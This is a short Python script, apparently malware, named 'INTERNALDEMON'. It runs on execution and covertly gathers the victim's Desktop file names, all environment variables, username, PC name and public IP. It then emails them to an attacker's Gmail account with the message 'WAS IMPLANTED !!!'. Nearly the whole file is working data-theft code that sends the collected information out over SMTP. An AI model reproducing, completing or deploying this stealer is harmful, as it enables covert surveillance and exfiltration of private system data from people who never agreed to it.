'''

NAME:    INTERNALDEMON
AUTHOR:  S1DAL3X
VERSION: 3.0
PYTHON:  3.6.1

Please enter your gmail login and password before using script
(login, password, login again)

'''

import os
import string
import shutil
import socket
import smtplib
from bs4 import BeautifulSoup
from urllib.request import urlopen     


LOGIN = os.getlogin()
FILES = []
INFO = str(os.environ)

def get_desktop():
    if os.getcwd() != "C://Users//" + str(LOGIN) + '//Desktop':
        os.chdir("C://Users//" + str(LOGIN) + '//Desktop')
        FILES = os.listdir()
    else:
        pass
        
    FILES_str = ''.join(FILES)
    FILES_str2 = ''.join(c for c in FILES_str if c in string.ascii_letters)
    get_outside_ip(FILES_str2, INFO)      
    
        
def get_outside_ip(arg, arg2):
    url = urlopen('https://yandex.ru/internet/')
    soup = BeautifulSoup(url, 'html.parser')
    out_str = soup.find('div', class_='client__desc')
    out_str = str(out_str)
    ip = []
    
    for symbol in out_str:
        if '1234567890.'.find(symbol) != -1:
            ip.append(symbol)
            
    outside_ip = ''.join(ip)
    
    report(outside_ip, arg, arg2)
    
    
def report(ip_adress, arg, arg2):
    array = ['\n OS_NAME => ' + str(os.environ['OS']),
             '\n LOGIN => ' + str(os.environ['USERNAME']),
             '\n PC_NAME => ' + str(os.environ['USERDOMAIN']),
             '\n DESKTOP_FILES => ' + arg,
             '\n SYS_INFO => ' + arg2]
    pc_name = socket.gethostname()
    report_text = str(ip_adress) + ' WAS IMPLANTED !!! \n\n' + '\n'.join(array)
    msgObject = smtplib.SMTP('smtp.gmail.com', 587)

    msgObject.starttls()
    msgObject.login('-----', '-----')
    msgObject.sendmail('123@gmail.com', '-----', str(report_text))
    msgObject.quit()
    

get_desktop()
#get_outside_ip()
